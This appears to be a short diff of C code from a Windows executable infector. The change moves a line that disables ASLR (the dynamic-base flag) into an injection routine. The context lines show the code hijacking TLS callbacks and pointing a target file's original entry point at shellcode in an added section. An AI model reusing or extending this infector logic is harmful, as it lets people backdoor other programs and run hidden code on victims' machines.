@@ -54,9 +54,6 @@ BOOL tlsInject(LPVOID baseAddress, ULONG_PTR callbackAddress) {
     *firstCallbackAddress = callbackAddress;
     *(firstCallbackAddress + 1) = 0;
 
-    // Turn off PIE
-    ntHeaders->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
-
     return TRUE;
 }
 
@@ -196,6 +193,9 @@ int inject(HANDLE kernel32, protoLoadLibraryA _LoadLibraryA, protoGetProcAddress
     // Change OEP to shellcode
     ntHeaders->OptionalHeader.AddressOfEntryPoint = newSection->VirtualAddress;
     // }
+
+    // Turn off PIE
+    ntHeaders->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
 
     _UnmapViewOfFile(targetAddress);
     _CloseHandle(targetMapping);
